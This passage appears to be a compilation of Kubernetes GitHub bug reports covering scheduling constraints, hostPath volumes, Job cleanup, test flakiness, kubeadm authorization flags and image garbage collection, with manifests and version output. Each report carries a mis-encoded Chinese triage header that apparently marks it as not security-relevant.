PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy
$ uname -a
Linux beta 5.15.0-1052-oracle #58-Ubuntu SMP Tue Feb 13 19:44:34 UTC 2024 aarch64 aarch64 aarch64 GNU/Linux

```

</details>


#### Install tools

<details>
kubeadm
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
runc
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
probably not of interest, but
- calico
- longhorn
- metallb
</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123746 pod topologySpreadConstraints nodeAffinityPolicy: Ignore not workï¼Ÿ

- Issue é“¾æ¥ï¼š[#123746](https://github.com/kubernetes/kubernetes/issues/123746)

### Issue å†…å®¹

#### What happened?

crd
```
apiVersion: apps/v1
kind: Deployment
metadata:
  name: myapp-deployment
spec:
  replicas: 6
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: myapp
    spec:
      containers:
      - name: myapp-container
        image: nginx
```

```
apiVersion: v1
kind: Pod
metadata:
  name: web-server
  labels:
    app: myapp
spec:
  containers:
  - name: web-server
    image: nginx
  affinity:
    nodeAffinity:
      requiredDuringSchedulingIgnoredDuringExecution:
        nodeSelectorTerms:
        - matchExpressions:
          - key: node-type
            operator: In
            values:
            - web
  topologySpreadConstraints:
  - maxSkew: 1
    topologyKey: kubernetes.io/hostname
    whenUnsatisfiable: DoNotSchedule
    labelSelector:
      matchLabels:
        app: myapp
    nodeAffinityPolicy: Ignore
```

```
root@29-b:~# kubectl get pod -n k8s  -owide -w
NAME                                READY   STATUS    RESTARTS   AGE   IP           NODE        NOMINATED NODE   READINESS GATES
myapp-deployment-7546cdb555-d55cf   1/1     Running   0          57m   10.0.1.118   worker-03   <none>           <none>
myapp-deployment-7546cdb555-dt4vs   1/1     Running   0          57m   10.0.0.129   worker-01   <none>           <none>
myapp-deployment-7546cdb555-j9v5z   1/1     Running   0          57m   10.0.1.61    worker-03   <none>           <none>
myapp-deployment-7546cdb555-kc9zf   1/1     Running   0          57m   10.0.3.79    master-01   <none>           <none>
myapp-deployment-7546cdb555-tzbnj   1/1     Running   0          57m   10.0.2.182   worker-02   <none>           <none>
myapp-deployment-7546cdb555-zjmsw   1/1     Running   0          57m   10.0.0.94    worker-01   <none>           <none>
web-server                          0/1     Pending   0          12m   <none>       <none>      <none>           <none>
```

2m16s       Warning   FailedScheduling    pod/web-server                           0/4 nodes are available: 4 node(s) didn't match Pod's node affinity/selector. preemption: 0/4 nodes are available: 4 Preemption is not helpful for scheduling.


nodeTaintsPolicy has the same problem

#### What did you expect to happen?

ignore nodeaffinity

#### How can we reproduce it (as minimally and precisely as possible)?

apply my crd,node without that label

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
^Croot@29-b:~ kubectl versionon
Client Version: v1.29.0
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.0
```

</details>


#### Cloud provider

<details>
vmware
</details>


#### OS version

<details>

```console
root@29-b:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123743 ReadWriteMany access mode should not be allowed with hostPath volumes.

- Issue é“¾æ¥ï¼š[#123743](https://github.com/kubernetes/kubernetes/issues/123743)

### Issue å†…å®¹

#### What happened?

We know that `hostPath` doesn't support `ReadWriteMany` access mode from the docs[1]. But if we attempt to create a PV and PVC with `hostPath` option enabled and the access mode with `ReadWriteMany`. Kubernetes allows this to be created but when the end goal is to have a common volume shared by many pods of a deployment running on multiple nodes. This setup causes confusion to the users, as they assumed everything is setup perfectly since there was no error while creating the PV and PVC. 
When the user tries to write some files from one of the pods, the data will not be accessible to the other pods, since it is mounting the `hostpath` and writing onto it.

This was observed with deployment that was deployed on GKE.
 
[1] https://kubernetes.io/docs/concepts/storage/persistent-volumes/#access-modes:~:text=%2D-,HostPath,-%E2%9C%93`

#### What did you expect to happen?

Kubernetes should not allow creating PV's with `hostPath` option enabled along with Access mode set to `ReadWriteMany`. We should provide some kind of error message or have a web-hook that blocks the creation of these PV's.

#### How can we reproduce it (as minimally and precisely as possible)?

- Create a PV and PVC with following configuration.

```
--- PV---
apiVersion: v1
kind: PersistentVolume
metadata:
  name: test-pv
spec:
  storageClassName: standard
  capacity:
    storage: 10Gi
  accessModes:
    - ReadWriteMany
  persistentVolumeReclaimPolicy: Retain
  hostPath:
    path: "/tmp/data"

---PVC---
apiVersion: v1
kind: PersistentVolumeClaim
metadata:
  name: test-pvc
spec:
  storageClassName: standard
  accessModes:
    - ReadWriteMany
  resources:
    requests:
      storage: 10Gi
  volumeName: test-pv

``` 

- Create a deployment that mounts the above volume at `/tmp/data` path like below
```
volumeMounts:
        - name: test-data
          mountPath: /tmp/data
      volumes:
        - name: test-data
          persistentVolumeClaim:
            claimName: test-pvc
```

- This will be successfully created but the user will not be able to access the shared volume since the `hostPath` option is mounting the host filesystem path of the node the pod is running. 







#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
WARNING: This version information is deprecated and will be replaced with the output from kubectl version --short.  Use --output=yaml|json to get the full version.
Client Version: version.Info{Major:"1", Minor:"27+", GitVersion:"v1.27.9-dispatcher", GitCommit:"8b508a33aafcd3ba51641b6b2ef203adbdd9de1e", GitTreeState:"clean", BuildDate:"2023-12-21T23:22:51Z", GoVersion:"go1.20.12", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"26", GitVersion:"v1.26.13-gke.1052000", GitCommit:"c88fda4c3b7ef204c20602c368811d8ba2fdd2e6", GitTreeState:"clean", BuildDate:"2024-01-23T17:45:47Z", GoVersion:"go1.20.13 X:boringcrypto", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
Google Cloud Platform 
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

$ uname -a
Linux cs-779332008923-default 6.1.58+ #1 SMP PREEMPT_DYNAMIC Mon Jan 29 15:19:25 UTC 2024 x86_64 GNU/Linux


```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123704 Completed Job leaves orphaned pod

- Issue é“¾æ¥ï¼š[#123704](https://github.com/kubernetes/kubernetes/issues/123704)

### Issue å†…å®¹

#### What happened?

We have a job template:
```
apiVersion: batch/v1
kind: Job
metadata:
  name: REPLACE_ME
spec:
  backoffLimit: 6
  ttlSecondsAfterFinished: 300
  template:
    metadata:
      name: test
    spec:
      serviceAccountName: job-sa
      containers:
      - name: document-test
        resources:
          limits:
            memory: 2000Mi
            cpu: 2000m
          requests:
            memory: 500Mi
            cpu: 500m
        image: REPLACE_ME
        imagePullPolicy: IfNotPresent
        volumeMounts:
          - name: secrets-volume
            mountPath: /app/secrets
      restartPolicy: Never
      volumes:
        - name: secrets-volume
          secret:
            secretName: ****-secrets
```

After launching a random number of jobs (10-600), all jobs are deleted after completion, whether the status is succeeded or failed. However, this does not remove all associated pods and leaves a random number of orphaned pods.

The problem arose suddenly, there were no changes to the teamplate. There are also no changes in the args for the container.

#### What did you expect to happen?

As before, I expected that all associated pods would be deleted after deleting the jobs.

#### How can we reproduce it (as minimally and precisely as possible)?

If there needed i can share my full job part.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
serverVersion:
  buildDate: "2024-01-02T20:34:38Z"
  compiler: gc
  gitCommit: 3f8ed3d5017d988600f597734a4851930eda35a6
  gitTreeState: clean
  gitVersion: v1.27.9-eks-5e0fdde
  goVersion: go1.20.12
  major: "1"
  minor: 27+
  platform: linux/amd64
```

</details>


#### Cloud provider

<details>
aws
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"
$ uname -a
Linux 5.10.209-198.858.amzn2.x86_64 #1 SMP Tue Feb 13 18:46:41 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123683 CustomResourceDefinition Watch test is flaky when run multiple times on a same cluster

- Issue é“¾æ¥ï¼š[#123683](https://github.com/kubernetes/kubernetes/issues/123683)

### Issue å†…å®¹

#### What happened?

We run conformance test on a same cluster multiple times. The test failed initially with

```
  INFO: Unexpected error: failed to list events in namespace "crd-watch-7911": 
      <*url.Error | 0xc004873770>: 
      Get "https://<CP_IP_AND_PORT>/api/v1/namespaces/crd-watch-7911/events": dial tcp <CP_IP_AND_PORT>: connect: connection refused
      {
          Op: "Get",
          URL: "https://<CP_IP_AND_PORT>/api/v1/namespaces/crd-watch-7911/events",
          Err: <*net.OpError | 0xc0006c3220>{
              Op: "dial",
              Net: "tcp",
              Source: nil,
              Addr: <*net.TCPAddr | 0xc003832750>{
                  <redacted>
                  Zone: "",
              },
              Err: <*os.SyscallError | 0xc002a6f680>{
                  Syscall: "connect",
                  Err: <syscall.Errno>0x6f,
              },
          },
      }
  [FAILED] in [DeferCleanup (Each)] - test/e2e/framework/debug/dump.go:44 @ 02/20/24 23:38:32.653
```

Then, all the subsequent tests failed with the following error

```
  [FAILED] failed to create CustomResourceDefinition: customresourcedefinitions.apiextensions.k8s.io "noxus.mygroup.example.com" already exists
  In [It] at: test/e2e/apimachinery/crd_watch.go:71 @ 02/21/24 23:36:15.799
```

****

#### What did you expect to happen?

The conformance test should withstand transient errors and crd should be cleaned up after the failed run

#### How can we reproduce it (as minimally and precisely as possible)?

The same issue can be reproduced by creating the same CRD on the cluster and run the conformance test. 

(Fix can also be verified by running conformance tests at least twice after CRD creation - the first run can fail, but the second run should pass)

```
apiVersion: apiextensions.k8s.io/v1
kind: CustomResourceDefinition
metadata:
  name: noxus.mygroup.example.com
spec:
  conversion:
    strategy: None
  group: mygroup.example.com
  names:
    categories:
    - all
    kind: WishIHadChosenNoxu
    listKind: NoxuItemList
    plural: noxus
    shortNames:
    - foo
    - bar
    - abc
    - def
    singular: nonenglishnoxu
  scope: Cluster
  versions:
  - name: v1beta1
    schema:
      openAPIV3Schema:
        type: object
        x-kubernetes-preserve-unknown-fields: true
    served: true
    storage: true
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"20", GitVersion:"v1.20.5", GitCommit:"6b1d87acf3c8253c123756b9e61dac642678305f", GitTreeState:"clean", BuildDate:"2021-03-18T01:10:43Z", GoVersion:"go1.15.8", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
This is a bare metal cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123677 SetFeatureGateDuringTest doesn't work if test is run in pararell. 

- Issue é“¾æ¥ï¼š[#123677](https://github.com/kubernetes/kubernetes/issues/123677)

### Issue å†…å®¹

#### What happened?

`defer featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.ConsistentListFromCache, true)()` should change the feature flag to true, however feature flag is a global state, so if somewhere in the test we call `t.Parallel()` there is a risk that some other test changes the flag state in the mean time.

Found this when we launched broken ConsistentListFromCache to Alpha and only noticed issues in Beta as the test didn't really test anything. https://github.com/kubernetes/kubernetes/pull/123674/files#r1511492942.



#### What did you expect to happen?

We should protect against usage of `featuregatetesting.SetFeatureGateDuringTest` and `t.Parallel` in a single test. 

#### How can we reproduce it (as minimally and precisely as possible)?

```
func TestFeatureGateOn(t *testing.T) {
	defer featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.ConsistentListFromCache, true)()
	runFeatureGateTest(t, true)
}

func TestFeatureGateOff(t *testing.T) {
	defer featuregatetesting.SetFeatureGateDuringTest(t, utilfeature.DefaultFeatureGate, features.ConsistentListFromCache, false)()
	runFeatureGateTest(t, false)
}

func runFeatureGateTest(t *testing.T, expectEnabled bool) {
	t.Parallel()
	time.Sleep(time.Second)
	gotEnabled := utilfeature.DefaultFeatureGate.Enabled(features.ConsistentListFromCache)
	if gotEnabled != expectEnabled {
		t.Errorf("unexpected feature gate state, got: %v, want: %v", gotEnabled, expectEnabled)
	}
}
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

N/A

#### Cloud provider

N/A

#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123651 [kubeadam][structured authz] can't use structured authz due to default `--authorization-mode` flag

- Issue é“¾æ¥ï¼š[#123651](https://github.com/kubernetes/kubernetes/issues/123651)

### Issue å†…å®¹

#### What happened?

**TL;DR**
https://github.com/kubernetes/kubernetes/blob/7c11cc9cfcdc54a7ca4efdc10609bf421bfa54d4/cmd/kubeadm/app/phases/controlplane/manifests.go#L232 prevents us from using structured authz (setting `--authorization-config` flag) as those flags are mutually exclusive

/cc @palnabarun (as the author of https://github.com/kubernetes/kubernetes/pull/120154)
/cc @liggitt 

FYI @stealthybox @robscott 

To use structured authz you need to define the authorization configuration using the `--authorization-config` flag.

However this flag is mutually exclusive with `--authorization-modes` and `--authorization-webhook-*` flags.  (refer to [1](https://github.com/kubernetes/kubernetes/blob/7c11cc9cfcdc54a7ca4efdc10609bf421bfa54d4/pkg/kubeapiserver/options/authorization.go#L113) & [2](https://kubernetes.io/docs/reference/access-authn-authz/authorization/#configuring-the-api-server-using-an-authorization-config-file))

Kubeadam adds `--authorization-mode` by default ([1](https://github.com/kubernetes/kubernetes/blob/7c11cc9cfcdc54a7ca4efdc10609bf421bfa54d4/cmd/kubeadm/app/phases/controlplane/manifests.go#L232) & [2](https://github.com/kubernetes/kubernetes/blob/7c11cc9cfcdc54a7ca4efdc10609bf421bfa54d4/cmd/kubeadm/app/phases/controlplane/manifests.go#L241)) which prevents us from using `--authorization-config`

#### What did you expect to happen?

I should be able to define the `authorization-config`  flag and have structured authz working.

#### How can we reproduce it (as minimally and precisely as possible)?

Spin up a kind cluster using this kind config (make sure the images are > 1.29 for structured authz to be avaliable)

```yaml
kind: Cluster
apiVersion: kind.x-k8s.io/v1alpha4
featureGates:
  StructuredAuthorizationConfiguration: true
kubeadmConfigPatches:
  - |
    kind: ClusterConfiguration
    metadata:
      name: config
    apiServer:
      extraArgs:
        authorization-config: "/files/authorization_config.yaml" 
      extraVolumes:
      - name: api-server-basic-auth-files
        hostPath: "/files"
        mountPath: "/files"
        readOnly: true
nodes:
- role: control-plane
  # add a mount from /path/to/my/files on the host to /files on the node
  extraMounts:
  - hostPath: <some-path-on-my-host>/refgrant-poc/files
    containerPath: /files
```

(For this bug, the content of `/files/authorization_config.yaml` doesn't matter.)

However, the cluster become unhealthy.
docker exec to the kind cluster container, where we can see the inner container of the apiserver has exited. 
Running `crictl logs <container>` we can see this error

<img width="1720" alt="image" src="https://github.com/kubernetes/kubernetes/assets/76940994/efeee626-7b6d-42de-a5e8-cee546b60194">


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
The kind cluster version image: `kindest/node:v1.29.2`
```

</details>


#### Cloud provider

<details>
N/A -I am using kind
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123631 The image of a running container was deleted by the image garbage collection

- Issue é“¾æ¥ï¼š[#123631](https://github.com/kubernetes/kubernetes/issues/123631)

### Issue å†…å®¹

#### What happened?

The image of the container was deleted while pod was running.
When I noticed it, it was already almost two weeks after the pod was created, and by prometheus metrics, I could see at the time that the pod was created the kubelet performed image garbage collection on the node and images were deleted.

It might be worth mentioning that nothing other than the kubelet could have deleted the image from the node.

This situation happen a while ago, and I couldn't deal with it for too long while it happened, So unfortunately I don't have data to share. But by looking in the code the following scenario seems to make sense:
1. At the start of the garbage collection process the image was already in the node (for a while), but not in used yet. 
2. The garbage collection get the current images and pods on that node from the runtime, because this image is not in use by any pod, it is considered unused.  Ref: https://github.com/kubernetes/kubernetes/blob/b340ef2e29b1694464bee60487160654d4bf8bbc/pkg/kubelet/images/image_gc_manager.go#L232-L247
3. Before the image is actually deleted, A pod using this image is scheduling at this node. since the image is already on the node and the `imagePullPolicy` is `IfNotPresent` there is no need for pulling and the container is start to running. There is no knowledge about that the image is about to be deleted. Ref: https://github.com/kubernetes/kubernetes/blob/b340ef2e29b1694464bee60487160654d4bf8bbc/pkg/kubelet/images/image_manager.go#L126-L143
4. The garbage collection is still running, and it eventually comes to delete this image. There is no knowledge about that the image is in use now.

In short, I think that in the time between pods are detected from runtime to find the unused image to the time those images are  actually deleted (the time between step 2 to step 4), new pods could be scheduling on that node, and make use of the images that will be deleted by the garbage collection immediately afterwards. Although the chances of this scenario are rare, the troublesome time I described would be bigger when the node could contain a lot of images and pods, and the difference between `HighThresholdPercent` and `LowThresholdPercent` have an effect as well.



#### What did you expect to happen?

The image garbage collection should not delete used images. 

#### How can we reproduce it (as minimally and precisely as possible)?

Suppose an unused image X has already been on the node for some time.
The timeline is designed as following,
![image](https://github.com/kubernetes/kubernetes/assets/34262680/01a8992a-95d8-44cb-bbca-8bcf249496a8)
Any pod that uses image X and is scheduling on the node within the orange zone will cause this issue.


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.3", GitCommit:"25b4e43193bcda6c7328a6d147b1fb73a33f1598", GitTreeState:"clean", BuildDate:"2023-06-14T09:53:42Z", GoVersion:"go1.20.5", Compiler:"gc", Platform:"linux/amd64"}
Kustomize Version: v5.0.1
Server Version: version.Info{Major:"1", Minor:"27", GitVersion:"v1.27.3", GitCommit:"25b4e43193bcda6c7328a6d147b1fb73a33f1598", GitTreeState:"clean", BuildDate:"2023-06-15T00:36:28Z", GoVersion:"go1.20.5", Compiler:"gc", Platform:"linux/amd64"}
```

</details>


#### Cloud provider

<details>
local
</details>


#### OS version

_No response_

#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

<details>
CRI-O v1.27.3 
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

ä¸æ¶‰åŠã€‚

---

## Issue #123618 warning message for `get` subcommand with `--watch`

- Issue é“¾æ¥ï¼š[#123618](https://github.com/kubernetes/kubernetes/issues/123618)

### Issue å†…å®¹

#### What happened?

When running subcommand `get` like this: `kubernetes get events --sort-by="{.lastTimestamp}" -w` a warning message will display: `warning: --watch or --watch-only requested, --sort-by will be ignored` which is incorrect in `watch` mode. It is only correct in `--watch-only` mode.

#### What did you expect to happen?

Warning message to only display when `--watch-only` flag is passed in. 

#### How can we reproduce it (as minimally and precisely as possible)?

Run `kubernetes get events --sort-by="{.lastTimestamp}" -w`

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.27.1
Kustomize Version: v5.0.1
Server Version: v1.27.8-gke.1067004
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123616 how to connect specific Pods of Api and asp.net core MVC in Kubernetes?

- Issue é“¾æ¥ï¼š[#123616](https://github.com/kubernetes/kubernetes/issues/123616)

### Issue å†…å®¹

#### What happened?

I have Two projects asp .net core Api and asp .net core MVC. In the asp .net core Api have a Two Replicas(instance) and asp .net core MVC have a three Replicas(instances).

So i want connect one pod of Api to one pod of MVC and than connect second pod of Api to second pod of MVC and than connect third pod of MVC to both pod of Api.

So i want when i Run the one pod of Api and MVC connected the Api data get and show in the MVC project.

So i want Pod's url for get data from Api.

#### What did you expect to happen?

I want to use with specific pod connection of Api and MVC to Get data through Api and show in MVC.

#### How can we reproduce it (as minimally and precisely as possible)?

I trying to pass pod url (Base Url) like this below image but this url is not working in MVC

I want to use with specific pod connection of Api and MVC to Get data through Api and show in MVC.



#### Anything else we need to know?

_No response_

#### Kubernetes version

![kub](https://github.com/kubernetes/kubernetes/assets/102901250/c3eb0ed0-72c0-46e2-8dd6-7c3b58193b86)


#### Cloud provider

    `    
   
      [HttpGet]

     public async Task<ActionResult> GetMySqlData()

    {

        string Baseurl = "http://webapiservice-0.webapiservice.default.pod.cluster.local:8081/";
        
        List<Customer> EmpInfo = new List<Customer>();

        using (var client = new HttpClient())
        {
            //Passing service base url  
            client.BaseAddress = new Uri(Baseurl);

            //Sending request to find web api REST service resource GetAllEmployees using HttpClient  
            HttpResponseMessage Res = await client.GetAsync("home/MySqlData");

            //Checking the response is successful or not which is sent using HttpClient  
            if (Res.IsSuccessStatusCode)
            {
                //Storing the response details recieved from web api   
                var EmpResponse = Res.Content.ReadAsStringAsync().Result;

                //Deserializing the response recieved from web api and storing into the Employee list  
                EmpInfo = JsonConvert.DeserializeObject<List<Customer>>(EmpResponse);

            }
            //returning the employee list to view  
            return View(EmpInfo);

        }
    }
`


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

## Issue #123612 When the node is in the NotReady state for 5 minutes, the DamonSet Pod on the node is still in the Running state.

- Issue é“¾æ¥ï¼š[#123612](https://github.com/kubernetes/kubernetes/issues/123612)

### Issue å†…å®¹

#### What happened?

When the kubelet on the node server2 stopped for 5 minutes, it was found that the Pod of DamonSet on the server2 node was still in the Running state. as follows:
![9bb35de7f03cfaf2a9a16225b7e3c4b](https://github.com/kubernetes/kubernetes/assets/110345347/7b8c6a8e-7ac0-4cfc-b8b9-ecce896408d3)


#### What did you expect to happen?

When the node is in the NotReady state for 5 minutes, the Pod of the DamonSet on the node should be in the NodeLost state.

#### How can we reproduce it (as minimally and precisely as possible)?

1. In a k8s cluster, stop the kubelet on one of the nodes.
2. After 5 minutes, observe the running status of the DamonSet Pod on this node.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version v1.28.2
# paste output here
```

</details>


#### Cloud provider

<details>
local
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>
CRI-O v1.28.2
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
Calico 
</details>



### åˆ†æç»“æœ

ä¸æ¶‰åŠ

---

